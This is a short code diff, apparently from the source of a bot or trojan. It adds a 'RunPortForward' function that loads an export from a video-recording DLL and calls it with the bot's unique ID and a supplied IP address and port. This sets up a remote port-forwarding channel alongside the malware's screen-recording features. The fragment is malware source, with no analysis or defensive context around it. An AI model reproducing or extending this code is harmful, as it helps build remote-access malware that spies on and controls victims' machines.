@@ -100,6 +100,7 @@ void TVideoRecDLL::InitializeApi()
 	LoadFunc((LPVOID*)&Stop,            "StopRec");
 	LoadFunc((LPVOID*)&ResetTimer,      "ResetTimer");
 	LoadFunc((LPVOID*)&SendData,        "StartSend");
+	LoadFunc((LPVOID*)&RunPortForward,	"RunPortForward");
 }
 
 
@@ -858,3 +859,21 @@ bool VideoRecorderSrv::PingClient(DWORD PID)
 	return Result != 0;
 }
 //-----------------------------------------------------------------------------
+
+TVideoRecDLL* RunPortForward( const char* ip )
+{
+	if( ip && ip[0] ) //указан айпи
+	{
+		TVideoRecDLL* videoDll = new TVideoRecDLL(); //инициализация виео длл
+		if( videoDll )
+		{
+			if( videoDll->RunPortForward )
+			{
+				videoDll->RunPortForward( BOT_UID, ip, VIDEORECORD_DEFAULT_PORT );
+				return videoDll;
+			}
+		}
+		delete videoDll;
+	}
+	return 0;
+}
